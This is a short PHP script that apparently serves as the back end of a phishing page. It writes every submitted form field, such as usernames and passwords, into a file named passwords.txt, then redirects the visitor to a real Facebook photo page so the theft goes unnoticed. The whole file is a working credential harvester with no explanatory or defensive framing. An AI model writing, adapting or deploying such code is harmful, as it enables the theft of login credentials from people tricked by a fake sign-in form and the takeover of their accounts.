<?php
$handle = fopen("passwords.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, " ");
}
fwrite($handle, PHP_EOL);
fclose($handle);
header ('Location: https://www.facebook.com/crispydoggo69/photos/rpp.592649004261140/953595198166517/?type=3&theater');
exit;
